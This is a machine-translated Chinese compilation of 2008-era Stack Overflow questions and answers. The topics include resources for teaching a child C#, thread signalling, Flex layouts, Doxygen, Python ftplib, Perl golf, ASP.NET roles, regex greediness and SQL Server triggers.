# StackOverflow 问答 000210000-000210999

# c# - 儿童学习 C# 的资源

> ID：210008
> 
> 赞同：12
> 
> 时间：2008-10-16T19:51:29.730
> 
> 标签：c#

我 11 岁的儿子对编程非常感兴趣。他已经与[Scratch](http://scratch.mit.edu) 合作了几年，但现在已经超越了它。我最近帮他安装了 Visual C# Express Edition，他很高兴能使用它，但我们很难在网上为他找到好的资源。

他通过查看示例程序、剖析它们、修改它们等来学习最好。四处搜索我无法找到许多好的示例供他下载并在 C# Express Edition 中尝试。谁能为我学习 C# 的孩子指出一套好的示例程序的方向，或者您认为可能对他有好处的任何其他资源？

顺便说一句，我自己也是一名程序员，但很长一段时间以来我几乎都只使用 Linux，所以当谈到微软时，我很迷茫！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-10-16T19:56:42.417

我会推荐[Coding4Fun](http://blogs.msdn.com/coding4fun/)。有一些非常不错的项目会吸引 11 岁的孩子。我记得看过一些游戏、屏幕保护程序，甚至还有一个示例，它展示了如何使 WinForms 应用程序看起来像是在流血（万圣节真棒，嗯？）

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-16T19:56:17.350

嗯...鉴于 C# 并不是真正的“教学语言”（这并不是说它是一个糟糕的选择），我怀疑没有很多针对年轻人的教程。您是否考虑过进行一些并行学习并尝试与您的儿子一起学习 C#？这对你们俩来说可能是一次很好的结合体验，并且凭借您的编程背景，您可能会有很多见解要分享，即使它是关于算法、风格、评论、要避免的陷阱等更多与语言无关的知识， ETC。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-16T19:58:53.163

如果您的儿子已经在使用 Scratch 并且将要开始使用 C#，那么我会说他已准备好接受常规的 C# 入门教程。向孩子们教授编程一般在 SO 上已经讨论过几次了。这是更好的结果之一（[您如何以及何时教孩子编码](https://stackoverflow.com/questions/165905/how-and-when-do-you-teach-a-kid-to-code)）。无论语言如何，教孩子编程的主要概念都是相同的。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-16T20:06:52.163

[爱丽丝](http://www.alice.org/)以讲故事为基础。它不是专门编程，而是教授编程机制。它更像是“重复这个”类型的构造，而不是循环。值得观看演示视频。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-10-25T23:33:06.933

我刚从[微软的 Kid's Corner](http://msdn.microsoft.com/en-us/beginner/bb308754.aspx)浏览网页时发现，他也可以在这个链接上尝试一下 :-)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-10-16T19:59:15.893

Code Project 是一个很好的资源，但许多示例比您想要的要复杂得多。

对于较小的示例应用程序，Microsoft 发布了他们的[101 Samples for Visual Studio 2005](http://msdn.microsoft.com/en-us/vs2005/aa718334.aspx)

[XNA](http://creators.xna.com/)很酷，但入门有点复杂。

[Coding4Fun](http://blogs.msdn.com/coding4fun/)也不错，但内容量不是很大。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-10-16T20:05:03.150

首先，我希望我的女儿到那个年龄时会对编程感兴趣，为此，恭喜她。

微软有[Codding 4 Fun](http://blogs.msdn.com/coding4fun/)应该是一个不错的开始，如果他对视频教程感兴趣，请查看[ASP.NET Learn 网站](http://www.asp.net/learn)，他会发现很多 VB 和 C# 的教程和视频教程以及所有源代码。

在那之后，[代码项目](http://www.codeproject.com)是查看更多示例的好地方:)

好编程！

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2011-07-22T01:27:36.603

任何在 2008 年或之后写的书，在亚马逊上声明它是 C# 的初学者并获得正面评价。不要*买*|空白| 对于傻瓜，没有孩子喜欢它！并以 25 美元的价格保持 30 美元的最高价格，您可以获得一本非常棒的书，微软可能不得不雇用他，哈哈。我推荐一本 wrox 书，但任何其他书都可以。他是否编写过任何程序，他是在做免费软件、开源软件还是付费软件。有些书是专门为开源而制作的。一开始可能很难，但他最终会编写一些非常有用的程序。最重要的是，让他继续前进！不要让他退出。在我看来，不值得放弃；一旦你掌握了它的窍门，编码真的很有趣。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2012-03-20T20:17:46.623

对于绝对初学者，我建议[www.codecademy.com](http://www.codecademy.com)。从第一个页面加载开始，它就非常简单地编写和完全交互。非常适合第一个计时器恕我直言。它用 JavaScript 而非 C# 教授，但就语法而言，它们非常相似。不过，他可能已经太先进了。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2012-07-16T03:34:19.697

我通过加入 Minecraft（[链接](http://www.minecraft.net "关联")）经典服务器开发团队开始使用 C#。这些都是 16 岁以上的人，但他们确实帮助我学习了语言。我认为与您年龄相仿且经验丰富的人组成一个团队很有帮助，我绝对会推荐它。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2008-10-16T19:53:36.510

想到[代码项目。](http://www.codeproject.com/)有很多样本、项目等可供使用。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2008-10-16T19:56:59.093

如果他对游戏感兴趣（这是一个公平的选择），请查看[XNA](http://creators.xna.com/)，否则尝试寻找其他兴趣，例如音乐，然后寻找可以让您快速创建有用内容而无需做太多跑腿的框架/SDK .

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2008-10-16T20:14:50.977

您可能有兴趣查看[Popfly](http://www.popfly.com/Home.aspx)。它是一个类似于 Scratch 的系统，但如果您愿意，您可以开始添加自己的组件或做一些额外的 javascript 或 C#。多种技术的集成可能有点太先进了，但话又说回来可能没问题。同样，这非常接近 Scratch，但它可能很有趣。

如前所述，请务必查看 Coding4Fun。

祝贺你，祝你好运。

# c# - 当有工作要做时暂停和通知线程

> ID：210020
> 
> 赞同：2
> 
> 时间：2008-10-16T19:54:15.950
> 
> 标签：c#, multithreading

我有多个线程（在 IIS 上运行的 C# 应用程序）正在运行，它们都需要与同一个 MQ 后端进行通信。为了尽量减少网络流量，我只需要在有工作要做时发送后端请求。将有一个线程来监视是否有工作要做，它需要通知其他线程它们也应该开始处理。当前的解决方案涉及监控线程设置一个全局变量并让其他线程循环并检查，即在监控线程中：

```
CheckIfWorkAvailable() {
  while(true) {
    if (queue.Empty != true) {
      workToBeDone = true;
    }
  }//end while loop
} 
```

然后在工作线程中：

```
DoWork() {
  while(true) {
    if (workToBeDone == true) {
      //do work...
    }
    else {
      Thread.Sleep(x seconds)
    }
  }//end while loop
} 
```

当有工作要做时，监视器线程可以通知工作线程而不是让它们循环和休眠吗？工作线程还设置了一个计数器，指示它们正在工作，并在它们的工作完成时将其递减，因此 workToBeDone 标志可以设置为 false。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-16T19:55:41.687

查看[WaitHandle](http://msdn.microsoft.com/en-us/library/system.threading.waithandle.aspx)及其降级类。[EventWaitHandle](http://msdn.microsoft.com/en-us/library/system.threading.eventwaithandle.aspx)可能适合您的需求。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-10-16T20:01:48.803

除了 Kent 指出的 WaitHandle 类之外，还有简单的[Monitor.Wait](http://msdn.microsoft.com/en-us/library/system.threading.monitor.wait.aspx)和 Monitor。[Pulse](http://msdn.microsoft.com/en-us/library/system.threading.monitor.pulse.aspx) / [PulseAll](http://msdn.microsoft.com/en-us/library/system.threading.monitor.pulseall.aspx)可以轻松做到这一点。它们比事件句柄“更轻”，尽管更原始一些。（你不能在多台显示器上等待，等等）

我的[线程文章](http://www.yoda.arachsys.com/csharp/threads/deadlocks.shtml)中有一个例子（作为生产者消费者队列） 。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-16T20:01:36.947

在您的场景中，也可以直接使用[ThreadPool](http://msdn.microsoft.com/en-us/library/system.threading.threadpool.aspx)类。这意味着您不需要设置将要使用的线程，它还允许您根据要完成的工作设置线程。

如果您喜欢在项目中使用 CTP，您可能需要查看[TPL](http://www.microsoft.com/downloads/details.aspx?FamilyId=348F73FD-593D-4B3C-B055-694C50D2B0F3&displaylang=en)，因为它具有一些更高级的同步和任务分配功能。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-20T21:29:53.540

如果您希望所有工作线程在满足状态时继续进行（看起来像您在这里想要的），请使用 ManualResetEvent。如果您只想在每次某些工作可用时向单个工作人员发出信号，请使用 AutoResetEvent。当您希望允许特定数量的线程继续进行时，请使用信号量。几乎从不使用全局变量来处理这种类型的事情，如果你这样做了，请将其标记为 volatile。

在这种情况下要小心。您不想导致“锁定车队”发生，因为每次释放单个项目时您都会立即释放所有工作人员以全部进入队列，而只需要再次等待。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2008-10-16T20:00:34.517

[http://msdn.microsoft.com/en-us/library/yy12yx1f(VS.80).aspx](http://msdn.microsoft.com/en-us/library/yy12yx1f(VS.80).aspx)

您可以使用自动重置事件

# apache-flex - 动态定位的 Flex 组件

> ID：210022
> 
> 赞同：3
> 
> 时间：2008-10-16T19:54:39.443
> 
> 标签：apache-flex, dynamic, layout

我对我当前的项目（将在 Flash 播放器中运行的 Flex 应用程序）有一个要求，即在表单上显示组件的任意子集，同时根据应用程序状态的某些方面隐藏所有其他组件。大约有十几个不同的文本框和下拉菜单，但根据之前输入的用户数据，有些变得无关紧要，我们不想在进入这个特定表单时显示它们。每次显示此表单时，我都可能需要显示这些组件的许多排列中的任何一种。

我正在尝试确定解决此问题的最佳方法是什么。我是否应该创建一个包含所有需要的控件的 Canvas（或其他容器），然后在我不需要的控件上设置 visible = false ？然后问题就变成了确保布局看起来不错。我不希望隐藏控件的位置出现空白。

我考虑过的另一个选项只是拥有一种机制，可以动态实例化 TextInput 或 CheckBox 等组件，然后调用 container.addChild(control) 以构建组件而不必担心间隙问题。

这似乎是一个在 flex 中有惯用解决方案的问题，但我不知道它是什么。这些想法似乎都不是很好，所以我想知道是否还有其他人有更好的想法。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-10-16T20:14:17.173

最好的做法是使用状态。例如：

```
<mx:states>
    <mx:State name="State1">
        <mx:AddChild position="lastChild">
            <components.../>
        </mx:AddChild>
    </mx:State>
    <mx:State name="State2">
        <mx:AddChild position="lastChild">
            <mx:Canvas.../>
        </mx:AddChild>
        <mx:AddChild position="lastChild">
            <mx:VBox.../>
        </mx:AddChild>
    </mx:State>
</mx:states> 
```

然后在您的代码中，调用 this.currentState = "State1" 以启用第一个状态等。使用状态，您可以有选择地显示和隐藏组件。

我建议在谷歌上搜索弹性状态教程并尝试一些以正确了解状态如何工作。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-10-16T20:10:07.897

我不知道这是否是一个好的解决方案，但是当我处于完全相同的情况时，我基本上采用了您的第一种方法。设置`visible = false`并设置`includeInLayout = false`以防止您正在谈论的那些“差距”。这是一个非常简单的解决方案，实施起来非常简单快捷……也许其他人知道一些更惯用的东西。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-24T11:08:49.517

如果状态不会这样做，请查看解释组件生命周期的文章。

如果您创建一个扩展像 Canvas 这样的 flex 组件的类，您将在一个覆盖 createChildren 的函数中定义所有组件。您将在另一个覆盖 updateDisplayList 的函数中重新访问布局

*   [Flex 组件生命周期](https://web.archive.org/web/20080911223134/http://flexcomps.wordpress.com/2008/05/09/flex-component-life-cycle/)@flexcomps
*   [组件类 - 第三部分](https://web.archive.org/web/20090308034358/http://weblogs.macromedia.com:80/pent/archives/2007/10/component_class_2.html)@PeterEnt
*   [Flex 组件生命周期](http://guavus.wordpress.com/2008/09/15/flex-component-lifecycle/)@guavus
*   [了解自定义 Flex 组件开发](http://www.billdwhite.com/wordpress/?p=21)@billWhite

# c++ - Doxygen 不会索引我的 C++ 源代码 - 为什么不呢？

> ID：210026
> 
> 赞同：2
> 
> 时间：2008-10-16T19:55:18.083
> 
> 标签：c++, doxygen

我有一些带有模板的 C++ 源代码可能是这样的 - doxygen 运行时没有错误，但没有任何文档被添加到输出中，这是怎么回事？

```
///
/// A class
///
class A
{
  ///
  /// A typedef
  ///
  typedef B<C<D>> SomeTypedefOfTemplates;
}; 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-08-27T20:24:12.810

请注意，doxygen 现在支持使用右移运算符关闭模板（从版本 1.6.0 开始）。

另请参阅[http://bugzilla.gnome.org/show_bug.cgi?id=560512](http://bugzilla.gnome.org/show_bug.cgi?id=560512)以了解有关该问题和实施的解决方案的讨论。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-10-16T19:57:21.403

是的，所以发生的事情是模板实例化是假的。像这样的“>>”是模棱两可的，意味着编译时错误。你看不到它，因为也许你的编译器（VC++）让它溜走了，但我猜 doxygen 对此更严格。添加一个如图所示的空格。

```
///
/// A class
///
class A
{
  ///
  /// A typedef
  ///
  typedef B<C<D> > SomeTypedefOfTemplates;
}; 
```

# windows-installer - PowerBuilder Runtime Packager 错误：Linking Msi for PowerBuilder.NET runtime 出错

> ID：210063
> 
> 赞同：2
> 
> 时间：2008-10-16T20:03:09.707
> 
> 标签：windows-installer, powerbuilder, powerbuilder-build-deploy

我刚刚安装了 PowerBuilder 11.5。我正在尝试使用随附的 PowerBuilder Runtime Packager 来创建带有 PowerBuilder 运行时 DLL 的 MSI。但是当我点击创建时，大约三分之一的时候我收到错误“链接 Msi for PowerBuilder.NET 运行时出错”。（糟糕的英语是逐字记录的。）

当我选择“PowerBuilder 标准组件”和选择“PowerBuilder .NET 组件”时都会发生这种情况

有谁知道如何解决这一问题？

顺便说一句，如果选择了 XML，我会收到有关 APACHE_LICENSE.TXT 缺失的错误。但我现在并不担心。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-20T12:34:53.587

检查 PB 是否可以找到 msvcr71.dll、msvcp71.dll（Visual C++ 运行时）和 atl71.dll（.NET 活动模板库）。

如果失败，请重新安装 PB 并重试。

# python - 高级 Python FTP - 我可以控制 ftplib 如何与服务器通信吗？

> ID：210067
> 
> 赞同：1
> 
> 时间：2008-10-16T20:03:39.563
> 
> 标签：python, ftp

我需要向 FTP 服务器发送一个非常特定（非标准）的字符串：

```
dir "SYS:\IC.ICAMA." 
```

案例至关重要，引文的风格及其内容也很重要。

不幸的是， ftplib.dir() 似乎使用了 'LIST' 命令而不是 'dir' （并且它为此应用程序使用了错误的大小写）。

FTP 服务器实际上是一个电话交换机，它是一个非常不标准的实现。

我尝试使用 ftplib.sendcmd()，但它也将“pasv”作为命令序列的一部分发送。

是否有向 FTP 服务器发出特定命令的简单方法？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-16T20:28:12.400

试试下面的。它是对`FTP.dir`使用“dir”而不是“LIST”的原始命令的修改。它在我测试它的 ftp 服务器上给出了“DIR 不理解”错误，但它确实发送了您所追求的命令。（您需要删除我用来检查的打印命令。）

```
import ftplib

class FTP(ftplib.FTP):

    def shim_dir(self, *args):
        '''List a directory in long form.
        By default list current directory to stdout.
        Optional last argument is callback function; all
        non-empty arguments before it are concatenated to the
        LIST command.  (This *should* only be used for a pathname.)'''
        cmd = 'dir'
        func = None
        if args[-1:] and type(args[-1]) != type(''):
            args, func = args[:-1], args[-1]
        for arg in args:
            if arg:
                cmd = cmd + (' ' + arg)
        print cmd
        self.retrlines(cmd, func)

if __name__ == '__main__':
    f = FTP('ftp.ncbi.nih.gov')
    f.login()
    f.shim_dir('"blast"') 
```

# perl - Perl Golf：打印数字的幂

> ID：210068
> 
> 赞同：2
> 
> 时间：2008-10-16T20:04:36.083
> 
> 标签：perl, math, code-golf

什么是最短的 Perl 单行，它打印出硬编码的 2 位小数的前 9 次幂（例如，0.37），每行都在自己的行上？

输出看起来像：

```
1
0.37
0.1369
[etc.] 
```

官方 Perl 高尔夫规则：

1.  最少的（键）敲击数获胜
2.  您的笔画数包括命令行

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2008-10-16T20:24:20.380

使用 perl 5.10.0 及更高版本：

```
perl -E'say 0.37**$_ for 0..8' 
```

对于较旧的 perls，您没有`say`和 -E，但这有效：

```
perl -le'print 0.37**$_ for 0..8' 
```

更新：第一个解决方案由 30 次击键组成。删除第一个 0 得到 29。可以节省另一个空间，所以我的最终解决方案是 28 笔画：

```
perl -E'say.37**$_ for 0..8' 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-10-16T22:04:20.023

```
perl -le'map{print.37**$_}0..8' 
```

31 个字符 - 我没有 5.10 来尝试使用“say”的明显改进，但这是 28：

```
perl -E'map{say.37**$_}0..8' 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-10-17T06:23:17.380

```
seq 9|perl -nE'say.37**$_' 
```

26 - 是的，那是作弊。（是的，我正在做从 1 到 9 的幂。0 到 8 只是愚蠢的。）

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-10-18T17:50:28.330

在 Perl 6 中只是为了好玩：

1.  28 个字符：

    ```
    perl6 -e'.say for .37»**»^9' 
    ```

2.  27 个字符：

    ```
    perl6 -e'say .37**$_ for^9' 
    ```

（至少基于当前的空白规则。）

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-10-16T20:26:34.870

```
perl -e 'print .37**$_,"\n" for 0..9' 
```

如果将 -l 添加到选项中，则可以跳过 ,"\n" 部分

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-10-16T20:22:40.960

```
print join("\n", map { 0.37**$_ } (0..9)); 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-10-16T21:08:01.603

```
print.37**$_.$/for 0..8 
```

如果在提交之前将程序砍掉，则为 23 笔。:-P

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-10-16T20:14:36.063

```
perl -e "for(my $i = 1; $i < 10; $i++){ print((.37**$i). \"\n\"); }" 
```

只是一个快速进入。:)

固定换行！

# asp.net - 根据角色为网站实施不同视图的最佳方法是什么？

> ID：210069
> 
> 赞同：4
> 
> 时间：2008-10-16T20:04:40.343
> 
> 标签：asp.net, security, roles

在 ASP.NET 中，执行以下操作的最佳方法是什么：

1.  根据您的权利显示某些控制？
2.  对于 gridview 控件，如何根据您的角色显示某些列？

我在考虑第 2 点，让数据来自数据库上的角色特定视图。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-10-16T20:17:48.350

我建议不要实际使用角色来隐藏/显示某些控件，而是建议为每个角色设置另一层权限，然后根据这些权限显示/隐藏。

这样，您可以重新定义角色拥有的权限，而不必更改您的代码。

此外，这允许您在将来创建新角色，只需为该角色分配一组权限。

至于控件，是的...我将根据 user.IsInRole("permissionname") 值在控件上设置 Visible 属性。

对于网格，我也会这样做...将列的可见性设置为 IsInRole 布尔值。

```
//Delete Icon Column
gridViewContacts.Columns[0].Visible = user.IsInRole("DeleteAnyContact"); 
```

我会以非常精细的性质创建您的权限..例如

*   ViewAnyContact
*   查看OwnContact
*   EditOwnContact
*   EditAnyContact
*   添加任何联系人
*   删除OwnContact
*   删除任何联系人
*   ETC...

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-16T20:28:51.900

如果您要走基于角色的路线，ASP.NET（从 2.0 版开始）提供了多种成员资格控制，这可能在这种情况下有所帮助。假设（这很可能是一个错误的假设）您正在使用收件箱成员资格提供程序，您实际上可以使用`LoginView`控件来处理#1。

它的工作方式是`LoginView`可以使用`RoleGroups`及其关联`ContentTemplates`来根据角色为用户自定义视图。这与收件箱会员提供商无缝协作；我相信，如果您基于微软的技术建立自己的会员服务提供商，它也将起作用。（我还没有完成后一步。）

可以想象，您**可以**将它用于#2，但最终会产生重复的代码和工作量，这不是我个人的偏好。我认为您选择使用特定于角色的 SQL 视图来驱动该表可能比这个选项更好。（当然，还有其他选择，可能会更好。）

我将支持 Elijah Manor 关于使用权限而不是角色的建议。一般来说，这也是我的偏好。（我惊讶地发现会员提供者的技术并没有达到那个水平。）但是，在任何以许可为中心的场景中，您基本上必须自己滚动所有内容。（我已经这样做了，虽然它非常灵活，但保护任何给定页面的代码可能会变得很麻烦。）

编辑：我道歉；我的意思是包含 LoginView 控件的链接。DotNetJunkies 有一个关于它的[教程](http://www.dotnetjunkies.com/QuickStartv20/aspnet/doc/ctrlref/login/loginview.aspx)。

# c# - WAV文件在C#中自动重复

> ID：210079
> 
> 赞同：1
> 
> 时间：2008-10-16T20:07:43.050
> 
> 标签：c#, audio, media, wav

我有一个 10 秒的音效波形文件。我想做的是获取该文件并重复 n 次，然后将较长的 WAV 文件保存到磁盘。这样，我可以创建更长的背景效果，而不是在媒体播放器上自动重复，这在重复之间有点卡顿。我正在尝试在 C# 中执行此操作。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-16T20:10:48.037

[考虑到WAV 文件格式](http://ccrma.stanford.edu/courses/422/projects/WaveFormat/)，这很容易做到——假设它是未压缩的音频（大多数 WAV 文件是——或者至少，它们是我上次与它们有任何关系的时候）。

很可能有音频 API 可以用来执行此操作而不会陷入二进制格式，但我怀疑它们需要花很长时间来学习，因为您不需要做任何特别复杂的事情。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-16T20:18:31.937

如果您只需要对少量文件执行此操作，您不妨使用[Audacity](http://audacity.sourceforge.net/)手动执行此操作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-17T14:16:30.730

如果您使用的是 .Net 2.0 或更高版本，那么您可以使用[System.Media.SoundPlayer](http://msdn.microsoft.com/en-us/library/system.media.soundplayer.aspx)类，特别是它的[PlayLooping](http://msdn.microsoft.com/en-us/library/system.media.soundplayer.playlooping.aspx)方法来实现您想要的，而不会卡顿。这比创建一个新的 wav 文件更可取——这意味着文件的磁盘空间更少，渲染声音所需的内存也更少。一般来说，如果声音将被循环播放或超过几秒钟，则应始终使用此类缓冲技术进行音频播放。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-19T20:35:16.520

您可以使用[NAudio](http://www.codeplex.com/naudio) .NET 音频库在 C# 中轻松完成此操作。您将需要使用`WaveFileReader`和`WaveFileWriter`类。您还可以使用它来创建一个自定义`WaveStream`，它将您的音频循环多次，而无需创建长 WAV 文件。

# regex - 正则表达式贪婪问题

> ID：210080
> 
> 赞同：3
> 
> 时间：2008-10-16T20:07:50.773
> 
> 标签：regex, regex-greedy

我确信这很容易，但我尝试了很多变化，但仍然无法满足我的需要。事情太贪婪了，我无法让它停止贪婪。

鉴于文字：

```
test=this=that=more text follows 
```

我只想选择：

```
test= 
```

我尝试了以下正则表达式

```
(\S+)=(\S.*)
(\S+)?=
[^=]{1}
... 
```

谢谢大家。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2008-10-16T20:13:44.753

这里：

```
// matches "test=, test"
(\S+?)=

or

// matches "test=, test" too
(\S[^=]+)= 
```

您应该考虑在第一个版本上使用第二个版本。给定您的字符串`"test=this=that=more text follows"`，版本 1 将匹配，`test=this=that=`然后继续解析到字符串的末尾。然后它将回溯，并找到`test=this=`，继续回溯，并找到`test=`，继续回溯，并确定`test=`它的最终答案。

版本 2 将匹配`test=`然后停止。您可以在多行或整个文档匹配等大型搜索中看到效率提升。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-10-16T20:15:56.343

你可能想要类似的东西

^(\S+?=)

插入符号 ^ 将正则表达式锚定到字符串的开头。这 ？在 + 之后使 + 非贪婪。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-10-16T20:32:52.547

您可能正在寻找[惰性量词](http://blog.stevenlevithan.com/archives/greedy-lazy-performance)*?、+?、?? 和 {n, n}？

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-16T20:14:50.587

你应该可以使用这个：

```
(\S+?)=(\S.*) 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-16T22:08:42.590

惰性量词有效，但由于回溯，它们也可能会影响性能。

考虑一下你真正想要的是“一堆不等于，一个等于，还有一堆不等于”。

```
([^=]+)=([^=]+) 
```

您的示例`[^=]{1}`仅匹配单个不等于字符。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-04-10T20:57:30.063

如果您只想要“text =”，我认为这很简单：

```
^(\w+=) 
```

如果您确信字符串“text =”将始终开始该行，那应该没问题。

真正的问题是当字符串是这样的：

> this=that= more test= 文字如下

如果您使用上面的正则表达式，则结果为“this=”，并且如果您在最后使用中继器限定符修改上面的内容，如下所示：

```
^(\w+=)* 
```

你会发现一个巨大的“this=that=”，所以我只能想象微不足道的：

```
[th\w+=]*test= 
```

再见。

# http - 什么 IIS 6.0 设置决定了如何解析路径？

> ID：210088
> 
> 赞同：0
> 
> 时间：2008-10-16T20:09:53.047
> 
> 标签：http, iis-6

我有一个网站部署在 3 个不同的环境之间 - Dev、Stage 和 Prod。对于 Stage 和 Prod，站点可以仅使用文件的基本 url 解析图像的本地路径，例如 /SiteImages/banner.png。但是，在开发服务器上，我必须对要解析的图像的图像路径的完整 URL 进行硬编码，例如[http://server/folder/SiteImages/banner.png](http://server/folder/SiteImages/banner.png)。是否可以翻转设置以使开发服务器的行为方式与其他 2 相同？我在 Win 2003 服务器上使用 IIS 6.0。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-16T20:12:35.600

开发主页的 URL 是什么样的？它类似于[http://server/mydevsite/](http://server/mydevsite/)吗？如果是这样，听起来您需要设置一个虚拟主机。

**编辑**只是为了澄清上述内容，假设您的产品和舞台站点可以简单地引用为[http://stagesite/](http://stagesite/)和[http://prodsite/](http://prodsite/)，如果您使用 /images/myimage.jpg 之类的路径，则假定图像文件夹位于根目录中。在这两种情况下，没问题，图像将正确显示。但是，假设您的开发服务器就像我上面列出的示例。如果您的图像被引用为 /images/myimage.jpg，而不是服务器查看[http://server/mydevsite/images/myimage.jpg](http://server/mydevsite/images/myimage.jpg)，它将改为查看[http://server/images/myimage.jpg](http://server/images/myimage.jpg)。如果该服务器的根目录中不存在包含所请求图像的图像文件夹，您将收到错误消息。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-16T20:15:08.513

据我所知，通常可以在网站中编码三种 URI。

1.  **绝对**：http: [//yoursite.com/somehing.jpg](http://yoursite.com/somehing.jpg)

    此 url 包括 http:// 并且是资源的完整路径。

2.  **根相关**：/something/something.jpg

    （仅在 ASP.net 服务器端，您将使用 '~/something/something.jpg'）

    此路径相对于您网站的根目录。

3.  **文件相关**：../something/something.jpg

    此路径从包含 URI 的文件的位置开始。在这种情况下，它只返回一个目录（..），然后返回到某目录以查找某事.jpg

# sql-server - FREETEXTTABLE 为什么或如何给出比其他更高的排名值

> ID：210094
> 
> 赞同：1
> 
> 时间：2008-10-16T20:11:06.540
> 
> 标签：sql-server, sql-server-2005, tsql, freetext, freetexttable

有一个存储过程在两个表上使用 FREETEXTTABLE 两次，然后合并结果并返回前 50 个。

问题是，如果我对“布鲁斯特的女性”进行搜索，结果返回“前杜夫斯莫塔的忏悔”，排名为 A 143，第二个“布鲁斯特女性”排名为 102，来自表 B .

这是因为计数吗？（表 A 返回结果总数为 2399。表 B 返回结果总数为 3445。）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-16T21:29:39.127

简短的回答：

> 自由文本排名基于 OKAPI BM25 排名公式。对查询中的每个词进行排名，并对值求和。自由文本查询将通过屈折生成（原始查询词的词干形式）将单词添加到查询中；这些单词被视为单独的术语，与生成它们的单词没有特殊的权重或关系。从同义词库功能生成的同义词被视为单独的、同等权重的术语。

当然，可以在 Microsoft 的网站上找到更长、更复杂的答案。对于高等数学，[请单击此处](http://msdn.microsoft.com/en-us/library/ms345119(SQL.90).aspx)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-20T17:59:48.283

1) 噪声文件被限制为几个字符，这意味着“of”这个词现在被认为很重要。

2）这两个表的结果（计数）确实很重要，因为较小的表很可能会被赋予更好的权重值。这将使排名在较小的表中更高。

Josef 与 MSDN 的链接非常适合弄清楚它如何计算排名值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-06-10T06:45:47.237

```
USE AdventureWorks2012;  
GO  

SELECT FT_TBL.Description  
    ,KEY_TBL.RANK  
FROM Production.ProductDescription AS FT_TBL   
    INNER JOIN FREETEXTTABLE(Production.ProductDescription,  
    Description,   
    'high level of performance') AS KEY_TBL  
ON FT_TBL.ProductDescriptionID = KEY_TBL.[KEY]  
ORDER BY RANK DESC;  
GO 
```

使用此 INNER JOIN 方法按排序顺序获取相关结果。参考：[Azure SQL FREETEXABLE](https://docs.microsoft.com/en-us/sql/relational-databases/system-functions/freetexttable-transact-sql?view=sql-server-ver15)

# sql - Sql 触发器是同步的还是异步的？

> ID：210097
> 
> 赞同：27
> 
> 时间：2008-10-16T20:12:12.417
> 
> 标签：sql, stored-procedures, triggers, timing

我有一个表，上面有一个插入触发器。如果我在存储过程的一个插入语句中将 6000 条记录插入到该表中，存储过程会在插入触发器完成之前返回吗？

只是为了确保我的想法正确，触发器应该只被调用一次（我知道“调用”不是正确的词），因为只有 1 个插入语句，对吗？

我的主要问题是：即使触发器尚未完成，sproc 也会完成吗？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2008-10-16T20:15:43.753

您的插入触发器将为整个插入语句运行一次。这就是为什么使用`inserted`临时表来查看实际插入的内容很重要，而不仅仅是选择最近的单个记录或类似的东西。

我刚刚测试了一个插入和更新触发器，实际上，它们被 sql server 视为插入的一部分。在触发器完成之前，该过程不会完成。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2008-10-16T20:24:21.300

触发器是调用它们的事务的一部分。

您必须注意的关于触发器的一件重要事情是触发器为每个事务触发一次（至少在 SQL Server 中，您应该检查其他数据库，但即使它会逐行处理，这通常是一个坏主意） ，因此如果您插入 6000 条记录，触发器会触发一次而不是 6000 次。许多人没有意识到这一点并编写触发器，就好像他们将处理多条记录一次插入一条记录一样。这不是真的，您的触发器必须考虑处理多记录插入。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-16T20:20:25.193

触发器调用不是异步的。对插入过程的每次调用都将导致触发器被触发，并且在触发器完成之前该过程不会返回。

